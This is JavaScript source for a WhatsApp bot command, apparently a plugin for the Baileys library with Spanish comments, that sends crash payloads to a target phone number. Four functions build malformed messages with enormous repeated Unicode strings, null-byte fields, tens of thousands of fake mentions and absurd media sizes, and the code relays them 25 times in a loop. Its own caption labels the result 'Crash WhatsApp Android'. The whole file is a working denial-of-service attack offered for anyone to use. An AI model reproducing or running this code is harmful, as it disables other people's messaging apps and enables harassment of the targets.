import { generateWAMessageFromContent } from '@whiskeysockets/baileys'; // o la librería que uses para generar mensajes

// Handler principal
let handler = async (m, { conn, text, isBan, reply }) => {
  if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`);

  // Si no escriben número, el objetivo será quien manda el mensaje (en privado)
  let targetId = text
    ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' // si ponen número, usar ese
    : m.sender; // si no ponen, usar al remitente (el que ejecuta el comando)

  let doneandro = `
*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮ᵢ𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp Android
⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Successfully
`;

  try {
    // Mensaje de confirmación visible en el chat actual
    await conn.sendMessage(m.chat, {
      image: { url: 'https://files.catbox.moe/w1isit.jpg' },
      caption: doneandro,
      footer: 'Please pause for 10 minutes so that the bot is not banned',
      buttons: [
        {
          buttonId: '#',
          buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
          type: 1,
        },
      ],
      headerType: 4,
      viewOnce: true,
    }, { quoted: m });

    // Aquí empiezan a enviarse los bugs al targetId
    for (let i = 0; i < 25; i++) {
      await bugandro2(targetId, true, conn);
      await androbug1(targetId, true, conn);
    }
    for (let i = 0; i < 25; i++) {
      await protocolbug3(targetId, true, conn);
      await bulldozer(targetId, conn);
    }
  } catch (error) {
    console.error('Error sending bug:', error);
    reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗');
  }
};

handler.command = ['androbugxxx'];
handler.rowner = false; // que cualquiera lo pueda usar
handler.premium = false;

export default handler;
// ------------ FUNCIONES ------------

// bugandro2
async function bugandro2(target, mention, conn) {
  const message = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `1@newsletter`,
          newsletterName: "ꦾ".repeat(120000),
          jpegThumbnail: "",
          caption: "ꦽ".repeat(15000) + "ꦾ".repeat(90000),
          inviteExpiration: Date.now() + 1814400000,
        },
      },
    },
    nativeFlowMessage: {
      messageParamsJson: "",
      buttons: [
        { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(49999) },
        {
          name: "galaxy_message",
          paramsJson: {
            screen_2_OptIn_0: true,
            screen_2_OptIn_1: true,
            screen_1_Dropdown_0: "nullOnTop",
            screen_1_DatePicker_1: "1028995200000",
            screen_1_TextInput_2: "null@gmail.com",
            screen_1_TextInput_3: "94643116",
            screen_0_TextInput_0: "\u0000".repeat(50000),
            screen_0_TextInput_1: "SecretDocu",
            screen_0_Dropdown_2: "#926-Xnull",
            screen_0_RadioButtonsGroup_3: "0_true",
            flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
          },
        },
      ],
    },
    contextInfo: {
      mentionedJid: [target, ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)],
      groupMentions: Array.from({ length: 49999 }, (_, i) => ({
        groupJid: i === 0 ? "12036332@g.us" : "120999" + Math.floor(Math.random() * 1e10).toString().padStart(10, "0") + "@g.us",
        groupSubject: "\u0000",
      })),
    },
  };
  await conn.relayMessage(target, message, { userJid: target });
}

// androbug1
async function androbug1(target, mention, conn) {
  const messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "☠️ 𐌃𐌀𐌋𐌂𐌔𐌔 ა𐌵ק𐌄𐌃 Ꮭ𐌃𐌀𐌔Ⴙ ☠️\n" + "ꦽ".repeat(90999),
          listType: 2,
          singleSelectReply: { selectedRowId: "🩸" },
          contextInfo: {
            participant: target,
            mentionedJid: [target],
            forwardedScore: 999,
            isForwarded: true,
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
          },
          description: "ꦽ".repeat(19999),
        },
      },
    },
  };
  const msg = generateWAMessageFromContent(target, messagePayload, {});
  await conn.relayMessage(target, msg.message, { messageId: msg.key.id, participant: target });
}

// protocolbug3
async function protocolbug3(target, mention, conn) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "109951162777600",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "\u9999",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)],
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [
            {
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "kontol",
                  songId: "peler",
                  author: "\u9999",
                  title: "\u9999",
                  artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                  artistAttribution: "https://www.instagram.com/_u/api_crash_image_raldzz_",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                },
              },
              embeddedAction: true,
            },
          ],
        },
      },
    },
  }, {});
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });
  if (mention) {
    await conn.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } },
        },
      },
      { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] }
    );
  }
}

// bulldozer
async function bulldozer(target, conn) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 99999, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            ],
            groupMentions: [],
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }],
      },
    ],
  });
}